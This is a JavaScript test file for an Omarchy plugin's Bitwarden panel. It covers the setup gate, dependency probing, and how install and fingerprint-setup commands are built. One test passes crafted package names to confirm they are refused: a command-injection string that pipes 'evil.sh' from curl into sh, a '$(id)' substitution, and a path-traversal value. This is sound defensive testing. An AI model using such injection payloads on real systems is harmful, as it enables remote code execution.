#!/usr/bin/env node
// Tests for the first run: the state a machine is in the moment
// `omarchy plugin add ... --enable` finishes and before `bw` exists.
//
// The plugin is installed and enabled before the CLI it drives necessarily
// does -- `omarchy plugin add` installs the plugin and nothing else -- so the
// panel has to open on the setup screen, install what is missing from inside
// itself, and pick the vault up on its own once the install lands. None of
// that is reachable on a developer machine where everything is already there,
// which is exactly why it is pinned here.
//
//   node tests/first-run.test.js

const fs = require("fs")
const path = require("path")
const panelSrc = fs.readFileSync(path.join(__dirname, "..", "Panel.qml"), "utf8")

const Model = {}
new Function("exports", fs.readFileSync(path.join(__dirname, "..", "BitwardenModel.js"), "utf8")
  .replace(/^\.pragma library\s*$/m, "") + `
  exports.parseDependencies = parseDependencies
  exports.missingRequired = missingRequired
  exports.setupGateActive = setupGateActive
  exports.dependencyProbeOutcome = dependencyProbeOutcome
  exports.missingPackages = missingPackages
  exports.installPackagesCommand = installPackagesCommand
  exports.fingerprintSetupCommand = fingerprintSetupCommand
  exports.applicableDependencies = applicableDependencies
  exports.dependencyCheckCommand = dependencyCheckCommand
  exports.DEPENDENCIES = DEPENDENCIES
`)(Model)

let pass = 0
const failures = []
const check = (label, ok, detail) => ok ? pass++ : failures.push(`${label}\n    ${detail}`)
const bodyOf = name => {
  const start = panelSrc.indexOf(`function ${name}(`)
  if (start < 0) return ""
  let depth = 0
  for (let i = panelSrc.indexOf("{", start); i < panelSrc.length; i++) {
    if (panelSrc[i] === "{") depth++
    else if (panelSrc[i] === "}" && --depth === 0) return panelSrc.slice(start, i + 1)
  }
  return ""
}

// A machine that has just installed the plugin and nothing else. The probe
// still answers for tools that are no longer on the wizard's list -- Omarchy
// ships those -- and parseDependencies must ignore what it was not asked
// about rather than inventing rows for it.
const FRESH = Model.parseDependencies(
  "bw=0\nbw_version=\njq=0\nwlcopy=1\nhyprctl=1\nsecrettool=1\nfprintd=0\nfingerprint_ready=0\nomarchy=1")
// The same machine after one trip through the setup screen's install button.
const INSTALLED = Model.parseDependencies(
  "bw=1\nbw_version=2025.1.2\njq=1\nwlcopy=1\nhyprctl=1\nsecrettool=1\nfprintd=1\nfingerprint_ready=0\nomarchy=1")
// Required tools only. The optional ones stay absent, and must not gate.
const MINIMAL = Model.parseDependencies(
  "bw=1\nbw_version=2025.1.2\njq=1\nwlcopy=1\nhyprctl=0\nsecrettool=0\nfprintd=0\nfingerprint_ready=0\nomarchy=1")

// Omarchy's own base packages. The wizard must never ask for one of these: a
// first-run screen whose rows are green on every machine that can run this
// plugin buries the single row that is not.
const OMARCHY_BASE = ["wl-clipboard", "libsecret", "hyprland", "glib2", "systemd", "openssl"]

// --- the gate ---------------------------------------------------------------
// Nothing is decided before the probe has actually run: a panel that gated on
// its own empty starting state would flash the setup screen on every launch.
check("gate: nothing is decided before the probe reports",
  Model.setupGateActive(FRESH, false, false) === false,
  "an unchecked dependency set closed the gate")

check("gate: a missing required tool closes the gate",
  Model.setupGateActive(FRESH, true, false) === true,
  "bw absent did not close the gate")

check("gate: the user can always step past it",
  Model.setupGateActive(FRESH, true, true) === false,
  "dismissing setup left the gate closed")

check("gate: missing optional tools do not close it",
  Model.setupGateActive(MINIMAL, true, false) === false,
  `gated on optional tools: [${Model.missingRequired(MINIMAL).map(d => d.key)}]`)

check("gate: opens once everything is installed",
  Model.setupGateActive(INSTALLED, true, false) === false,
  "a fully installed machine was still gated")

// --- the first-run sequence -------------------------------------------------
// Walked in order, because the bug this guards against is an ordering one: the
// panel probing `bw` before it knows whether `bw` exists lands the user on a
// login form that cannot succeed.
let probeStarted = false
let wasGated = false
const step = (deps, dismissed) => {
  if (Model.missingRequired(deps).length > 0) wasGated = true
  const outcome = Model.dependencyProbeOutcome(deps, dismissed, probeStarted, wasGated)
  if (outcome === "probe") {
    probeStarted = true
    wasGated = false
  }
  return outcome
}

check("first run: opens on setup rather than probing the vault",
  step(FRESH, false) === "setup",
  "a fresh machine did not land on setup")
check("first run: refreshStatus waits for the dependency answer before invoking bw",
  /if\s*\(!depsChecked\)\s*\{[\s\S]{0,100}checkDependencies\(\)[\s\S]{0,40}return/.test(bodyOf("refreshStatus")),
  bodyOf("refreshStatus"))

check("first run: still setup while the install runs",
  step(FRESH, false) === "setup",
  "a re-probe with bw still absent moved off setup")

check("first run: the install landing sends it to the vault unprompted",
  step(INSTALLED, false) === "probe",
  "bw appearing did not trigger the status probe")

check("first run: settled, so a routine re-probe asks bw nothing",
  step(INSTALLED, false) === "idle",
  "a routine dependency check re-probed the vault")

// --- an already-set-up machine ----------------------------------------------
probeStarted = false
wasGated = false
check("normal launch: the first probe goes straight to the vault",
  step(INSTALLED, false) === "probe",
  "a machine with everything installed did not probe on launch")

check("normal launch: later probes stay quiet",
  step(INSTALLED, false) === "idle",
  "a settled machine kept re-probing")

// --- carrying on without the CLI --------------------------------------------
// "Continue anyway" is the panel's own escape hatch. Having taken it, the user
// must not be dragged back to setup, and the panel must not spend a `bw`
// round trip on every dependency check it happens to run.
probeStarted = true
wasGated = false
check("dismissed: a missing tool no longer forces setup",
  step(FRESH, true) === "idle",
  "setup reappeared after being dismissed")

check("dismissed: still no repeated vault probes while the tool is missing",
  step(FRESH, true) === "idle",
  "a dismissed gate probed the vault on every dependency check")

check("dismissed: an install landing later is still picked up",
  step(INSTALLED, true) === "probe",
  "installing after dismissing setup never reached the vault")

// --- what the install button asks for ---------------------------------------
const fresh = Model.missingPackages(FRESH)
check("install: asks for the tools it can install, and only those",
  fresh.join(" ") === "bitwarden-cli jq",
  `got [${fresh}]`)

check("install: never asks for a package Omarchy already ships",
  Model.DEPENDENCIES.every(d => OMARCHY_BASE.indexOf(d.pkg) === -1),
  `wizard lists [${Model.DEPENDENCIES.map(d => d.pkg).filter(p => OMARCHY_BASE.indexOf(p) !== -1)}]`)

check("install: the one thing an Omarchy machine can genuinely lack is still required",
  Model.DEPENDENCIES.some(d => d.pkg === "bitwarden-cli" && d.required),
  `wizard lists [${Model.DEPENDENCIES.map(d => d.pkg)}]`)

check("install: asks for nothing when nothing is missing",
  Model.missingPackages(INSTALLED).length === 0,
  `got [${Model.missingPackages(INSTALLED)}]`)

check("install: a package shared by two tools is only asked for once",
  new Set(fresh).size === fresh.length,
  `got [${fresh}]`)

// Omarchy already owns "install these packages where the user can watch it":
// a floating, centred, themed terminal with the logo, the pacman output and a
// keypress to close. Rolling our own terminal invocation would have to pick a
// terminal, invent the wait-for-keypress, and still look like nothing else on
// the system.
const cmd = Model.installPackagesCommand(fresh, "Bitwarden CLI")
check("install: goes through Omarchy's floating-terminal installer",
  cmd.slice(0, 3).join(" ") === "omarchy install app",
  cmd.join(" "))

check("install: names what is being installed, and asks for exactly the packages",
  cmd[3] === "Bitwarden CLI" && cmd[4] === fresh.join(" "),
  cmd.join(" "))

check("install: no shell of our own to quote for",
  cmd.every(a => typeof a === "string") && cmd.indexOf("-c") === -1,
  cmd.join(" "))

// omarchy-install-app expands the package list unquoted -- that is how it
// takes more than one package -- so the guard has to be on this side.
check("install: refuses anything that is not a plain package name",
  Model.installPackagesCommand(["bitwarden-cli; curl evil.sh | sh"]) === null
    && Model.installPackagesCommand(["$(id)"]) === null
    && Model.installPackagesCommand(["../../etc/passwd"]) === null,
  "a crafted package name produced a command")

// --- fingerprint belongs to Omarchy -----------------------------------------
// `omarchy setup security fingerprint` detects the reader, installs
// libfprint/fprintd/usbutils, enrols a finger, verifies it, and only then
// writes /etc/pam.d/omarchy-lock-fingerprint -- which is the file this
// plugin's own readiness check looks for. A bare `pkg add fprintd` produces
// none of that, so the row must never take that door.
check("fingerprint: the row is a setup row, not a package row",
  Model.DEPENDENCIES.find(d => d.key === "fprintd").setup === true,
  "fprintd is still presented as an ordinary package install")

check("fingerprint: never reaches the package installer",
  Model.missingPackages(Model.parseDependencies(
    "bw=1\nbw_version=2025.1.2\njq=1\nfprintd=0\nfingerprint_ready=0\nfingerprint_hw=1\nomarchy=1")).length === 0,
  "fprintd was handed to omarchy install app")

const fp = Model.fingerprintSetupCommand()
check("fingerprint: runs Omarchy's own setup in the floating terminal",
  fp.join(" ") === "omarchy launch floating terminal with presentation omarchy setup security fingerprint",
  fp.join(" "))

// --- hardware the machine does not have -------------------------------------
const NO_READER = Model.parseDependencies(
  "bw=1\nbw_version=2025.1.2\njq=1\nfprintd=0\nfingerprint_ready=0\nfingerprint_hw=0\nomarchy=1")
const WITH_READER = Model.parseDependencies(
  "bw=1\nbw_version=2025.1.2\njq=1\nfprintd=0\nfingerprint_ready=0\nfingerprint_hw=1\nomarchy=1")

check("reader: a desktop with no reader is not shown a fingerprint row",
  Model.applicableDependencies(NO_READER).every(d => d.key !== "fprintd"),
  `rows: [${Model.applicableDependencies(NO_READER).map(d => d.key)}]`)

check("reader: a laptop with one is",
  Model.applicableDependencies(WITH_READER).some(d => d.key === "fprintd"),
  `rows: [${Model.applicableDependencies(WITH_READER).map(d => d.key)}]`)

check("reader: the row is still in items either way, for the settings screen",
  NO_READER.items.some(d => d.key === "fprintd"),
  "dropping the row from items would break settingBlocked()")

check("reader: no reader never gates the panel",
  Model.setupGateActive(NO_READER, true, false) === false,
  "a machine with no fingerprint reader was held on setup")

// Detection comes from Omarchy's own sysfs scan, which answers before fprintd
// or usbutils are installed -- which is precisely when the wizard has to
// decide whether to draw the row.
check("reader: detection uses omarchy-hw-fingerprint, in the same one probe",
  Model.dependencyCheckCommand()[2].includes("omarchy-hw-fingerprint")
    && Model.dependencyCheckCommand().length === 3,
  Model.dependencyCheckCommand()[2])

check("install: nothing to install produces no command at all",
  Model.installPackagesCommand(Model.missingPackages(INSTALLED)) === null,
  "an empty package list still produced a command")

// The setup screen's copy is the first thing a new user reads, and it is the
// only place the plugin explains that it does not bundle these tools. A
// requirement described as fatal reads as "you installed this too early".
const bw = Model.DEPENDENCIES.find(d => d.key === "bw")
check("copy: the required tools are presented as installable, not as a wall",
  bw.required === true && !/nothing works/i.test(bw.purpose),
  bw.purpose)

console.log(`${pass} passed, ${failures.length} failed`)
if (failures.length) {
  console.log("\n" + failures.map(f => `  FAIL ${f}`).join("\n"))
  process.exit(1)
}
